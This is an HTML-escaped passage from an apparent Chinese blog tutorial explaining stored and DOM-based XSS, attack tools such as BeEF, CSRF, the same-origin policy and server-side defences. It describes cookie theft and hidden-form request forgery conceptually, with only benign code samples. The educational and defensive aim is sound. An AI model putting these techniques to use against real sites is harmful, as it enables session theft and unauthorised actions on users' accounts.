&lt;li&gt;就是它是 &lt;strong&gt;persistent&lt;/strong&gt; 持久的，并且所有能够获取恶意代码内容的用户都会收到影响； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;这种情况下同时用户的防备更小，因为网页链接是正常的，而在正常加载中却出现了恶意代码的执行，可谓防不胜防。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;总结来说Stored XSS的执行分两步走： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Step1: &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;攻击者上传还有恶意脚本代码的内容到服务器； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;服务器长期存储这些恶意脚本代码（存储到数据库中）； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Step2 &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;受害者访问这些有漏洞的网页； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;服务器从数据库中取出恶意脚本代码嵌入返回给受害者的网页中； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;继而浏览器自动解析和执行这些恶意脚本代码； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;dom-based-xss&#34;&gt;DOM-based XSS&lt;/h3&gt;
&lt;p&gt;在介绍DOM XSS之前，我们需要首先了解一下DOM是什么： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;DOM(Document object model)文档对象模型，将网页当作一个文档，并用一种树状结构存储网页中的所有的标签以及其他的信息，同时提供了API供JS等脚本语言对页面内容进行查询与修改。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们可以通过浏览器的开发者工具来查看网页的DOM内容。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们可以看看JS代码调用DOM API的效果，此处的window/document元素就代表着整个网页文档： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;onload&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;window.alert(&amp;#39;welcome to my home page!&amp;#39;);&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;还可以为利用DOM API，通过js为网页创建标签，写入内容等信息： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;head&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// run this function when the document is loaded
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;       &lt;span class=&#34;nb&#34;&gt;window&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;onload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;// create a couple of elements
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;c1&#34;&gt;// in an otherwise empty HTML page
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;       &lt;span class=&#34;nx&#34;&gt;heading&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createElement&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;h1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;nx&#34;&gt;heading_text&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;createTextNode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Big Head!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;nx&#34;&gt;heading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;appendChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;heading_text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       &lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;appendChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;heading&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/script&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/head&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/body&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;/html&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;现在我们回到 &lt;strong&gt;DOM XSS&lt;/strong&gt;, 其与前面两种XSS的最大的区别就在于：攻击的过程完全只涉及客户端，而不依赖服务器端的返回。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;其步骤一般为： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;攻击者利用DOM API构造一段含有一段直接篡改页面DOM结构的代码，然后嵌入链接中发送给受害者； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;受害者点击链接并向服务器请求网页； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;服务器端收到请求，但是看不懂也无法执行篡改DOM结构的代码，直接将其与原本合法的网页返回给客户端； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;客户端解析网页同时发现有修改DOM结构的代码，解析执行，造成危害； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;xss的工具&#34;&gt;XSS的工具&lt;/h3&gt;
&lt;p&gt;BeEF以及各类XSS平台都提供了自动脚本，只需要将组织好的脚本插入，就可以执行自己想要的操作: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-19_17-00-28_screenshot.png&#34;
         alt=&#34;Figure 5: BeEF&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 5: &lt;!-- raw HTML omitted --&gt;BeEF&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;各种XSS平台也可以提供很多功能： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-19_16-19-01_screenshot.png&#34;
         alt=&#34;Figure 6: XSS平台&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 6: &lt;!-- raw HTML omitted --&gt;XSS平台&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h2 id=&#34;csrf&#34;&gt;CSRF&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Cross-Site Request Forgery&lt;/strong&gt; (CSRF, 读做 &amp;ldquo;sea-surf&amp;rdquo;)，其主要目标是利用用户已经登录的登录凭证（session, cookie）来执行一系列越权的操作。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;CSRF的主要执行流程为： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;受害者先登录存在漏洞的网站，并且保存session cookie的内容在本地，如此便无需重复登录； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;黑客向受害者发送一个恶意网站的链接（链接中只可以包含网址），诱导受害者点击后请求该网页的资源； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;这个网页中带有 &lt;strong&gt;隐藏表格&lt;/strong&gt; 来自动发起POST请求，向存在漏洞的目标网站发送恶意操作的请求（例如修改账号密码）； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;此举能够成功是因：浏览器在发送请求的时候，会自动带上该域名下的所有本地存储的cookie，也就是可以伪装称是本人发出的修改请求，而用户本人可以对次完全不知情； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-19_21-50-14_screenshot.png&#34;
         alt=&#34;Figure 7: CSRF的步骤&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 7: &lt;!-- raw HTML omitted --&gt;CSRF的步骤&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们这里可以总结一下CSRF与XSS的区别，我们假设： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;存在漏洞的目标网站为 &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.vulnerable.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.vulnerable.com&lt;/a&gt;&lt;/strong&gt;; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;黑客构造的网页叫做 &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.malicious.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.malicious.com&lt;/a&gt;&lt;/strong&gt;; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在XSS中要完成的目标是： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;诱导用户点击 &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.vulnerable.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.vulnerable.com&lt;/a&gt;&lt;/strong&gt; 的链接（DOM，Reflected需要修改url，Stored则不需要）; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;然后使本地浏览器在当前页面下执行恶意代码，例如直接盗取cookie; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在CSRF中要完成的目标是: &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;诱导用户点击 &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.malicious.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.malicious.com&lt;/a&gt;&lt;/strong&gt; 的链接; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.malicious.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.malicious.com&lt;/a&gt;&lt;/strong&gt; 在网页中会自动发起对 &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.vulnerable.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.vulnerable.com&lt;/a&gt;&lt;/strong&gt; 的请求； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;浏览器此时就会为这个请求附带上所有域名在 &lt;strong&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.vulnerable.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;www.vulnerable.com&lt;/a&gt;&lt;/strong&gt; 下的cookie，从而伪装成用户对服务器端造成影响； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;same-origin-policy-浏览器的同源策略&#34;&gt;Same-origin policy 浏览器的同源策略&lt;/h2&gt;
&lt;p&gt;看到了上面的例子之后，我想提出一个问题： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;为什么我们不能直接从第三方网站获取用户在目标网站下的cookie呢？ &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;而还需要通过用户来发起这个请求； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;这里就涉及到了浏览器的同源策略机制： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;同源策略是各个浏览器用于限制 &lt;strong&gt;不同源&lt;/strong&gt; 的网页直接进行 &lt;strong&gt;资源交换&lt;/strong&gt; 行为的一种安全策略。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们这里需要强调：同源策略是由浏览器制定的，用于保护存放在浏览器上的内容，比如相当重要的session cookie，我们知道可以利用 &lt;code&gt;document.cookie&lt;/code&gt; 来获取当前页面的cookie，如果没有同源策略，那么黑客就可以通过注入JS脚本来获取用户存放与客户端的所有内容，也可以继续调用DOM的API进行DOM内容的修改以及访问，这是非常危险的。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;那么同源策略到底是如何做到的，我们就先从了解 &lt;code&gt;同源&lt;/code&gt; 这个概念讲起： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;同源-的概念&#34;&gt;“同源”的概念&lt;/h3&gt;
&lt;p&gt;两个URLs如果被称为同源，他们必须要保证以下内容保持一致： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;协议(http/https); &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;host； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;端口（如果被指定了的话）； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因此这个方案也被称为“协议/主机/端口元祖” &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;而访问资源的路径不一样没有关系； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;我们通过一个例子来解释： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;针对URL： &lt;code&gt;http://store.company.com/dir/page.html&lt;/code&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;URL&lt;/th&gt;
&lt;th&gt;类别&lt;/th&gt;
&lt;th&gt;原因&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;http://store.company.com/dir2/other.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://store.company.com/dir2/other.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;同源&lt;/td&gt;
&lt;td&gt;只有路径不同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;http://store.company.com/dir/inner/another.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://store.company.com/dir/inner/another.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;同源&lt;/td&gt;
&lt;td&gt;只有路径不同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;https://store.company.com/page.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://store.company.com/page.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;不同源&lt;/td&gt;
&lt;td&gt;协议不同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;http://store.company.com:81/dir/page.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://store.company.com:81/dir/page.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;不同源&lt;/td&gt;
&lt;td&gt;端口号不同&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;a class=&#34;link&#34; href=&#34;http://news.company.com/dir/page.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://news.company.com/dir/page.html&lt;/a&gt;&lt;/td&gt;
&lt;td&gt;不同源&lt;/td&gt;
&lt;td&gt;Host不同&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;跨站网络访问&#34;&gt;跨站网络访问&lt;/h3&gt;
&lt;p&gt;不同源的网页之间进行交互的方式一般由三种操作： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Cross-origin &lt;strong&gt;writes&lt;/strong&gt; 跨站写操作： &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;一般来说是被允许的，比如页面中的链接（links），重定向以及表单提交； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cross-origin &lt;strong&gt;embedding&lt;/strong&gt; 跨站资源嵌入： &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;一般来说也是被允许的; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Cross-origin &lt;strong&gt;reads&lt;/strong&gt; 跨站读操作： &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;一般来说是不被允许的，即从一个网页向另一个网页直接获取数据，资源； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这里跨站资源嵌入的一些例子： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;lt;script src=&amp;rdquo;&amp;hellip;&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; 标签嵌入跨站脚本。语法错误信息只能被同源脚本中捕捉到。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&amp;lt;link rel=&amp;ldquo;stylesheet&amp;rdquo; href=&amp;quot;&amp;hellip;&amp;quot;&amp;gt; 标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨站需要一个设置正确的 HTTP 头部 Content-Type 。不同浏览器有不同的限制： IE, Firefox, Chrome, Safari (跳至CVE-2010-0051)部分 和 Opera。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;通过 &amp;lt;img&amp;gt; 展示的图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,&amp;hellip; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;通过 &amp;lt;video&amp;gt; 和 &amp;lt;audio&amp;gt; 播放的多媒体资源。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;通过 &amp;lt;object&amp;gt;、 &amp;lt;embed&amp;gt; 和 &amp;lt;applet&amp;gt; 嵌入的插件。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;通过 @font-face 引入的字体。一些浏览器允许跨站字体（cross-origin fonts），一些需要同源字体（same-origin fonts）。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;通过 &amp;lt;iframe&amp;gt; 载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨站交互。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;如何允许跨站访问&#34;&gt;如何允许跨站访问&lt;/h3&gt;
&lt;p&gt;可以通过由服务端发回的HTTP响应中添加 &lt;a class=&#34;link&#34; href=&#34;https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;CORS&lt;/a&gt; header来标明哪些Origin域可以加载其资源； &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;如何阻止跨站访问&#34;&gt;如何阻止跨站访问&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;阻止跨站 &lt;strong&gt;写操作&lt;/strong&gt;, 只要检测请求中的一个不可推测的标记(CSRF token)即可，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。你必须使用这个标记来阻止页面的跨站读操作。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;阻止资源的跨站读取，需要保证该资源是不可嵌入的。阻止嵌入行为是必须的，因为嵌入资源通常向其暴露信息。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;阻止跨站嵌入，需要确保你的资源不能通过以上列出的可嵌入资源格式使用。浏览器可能不会遵守 Content-Type 头部定义的类型。例如，如果您在HTML文档中指定 &amp;lt;script&amp;gt; 标记，则浏览器将尝试将标签内部的 HTML 解析为JavaScript。 当您的资源不是您网站的入口点时，您还可以使用CSRF令牌来防止嵌入。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;跨站数据存储访问&#34;&gt;跨站数据存储访问&lt;/h3&gt;
&lt;p&gt;Cookies 使用不同的源定义方式： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个页面可以为 &lt;strong&gt;本域&lt;/strong&gt; 和其 &lt;strong&gt;父域&lt;/strong&gt; 设置 cookie，只要是父域不是公共后缀（public suffix）即可。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;Firefox 和 Chrome 使用 Public Suffix List 检测一个域是否是公共后缀（public suffix）。 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;countermeasure-如何防范针对web客户端的攻击&#34;&gt;Countermeasure 如何防范针对WEB客户端的攻击&lt;/h2&gt;
&lt;p&gt;我们可以将主要的对策分为两种： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;dl&gt;
&lt;dt&gt;客户端上的防御&lt;/dt&gt;
&lt;dd&gt;客户端的防御依赖于用户的 &lt;strong&gt;安全意识&lt;/strong&gt; 以及一些浏览器还有插件的辅助: &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;尽量访问原始网站，不要访问那些后面带着很多GET参数的链接； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;默认关闭JS（利用插件）来避免恶意代码的执行； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;在访问比较敏感的网页的时候尽量不要访问其他的网站（防止这些敏感的网页所使用的cookie被利用）； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;及时关闭重启浏览器（结束session）； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/dd&gt;
&lt;dt&gt;服务端&lt;/dt&gt;
&lt;dd&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;XSS &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;HttpOnly cookie: &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;服务端给一些重要的cookie设置 &lt;code&gt;HttpOnly&lt;/code&gt; 属性，从而避免这些cookie被脚本语言所调用查看以及利用 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HttpOnly&lt;/strong&gt; 我们在前面介绍过，即设置了这个属性的Cookie无法被JS访问，也就不会泄露了； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Input validation 输入检查： &lt;!-- raw HTML omitted --&gt;
&lt;ul&gt;
&lt;li&gt;对于所有的用户输入我们都需要进行严格的检查以及过滤，阻止一些恶意脚本的插入（e.g. htmlspecialchars() in php）； &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
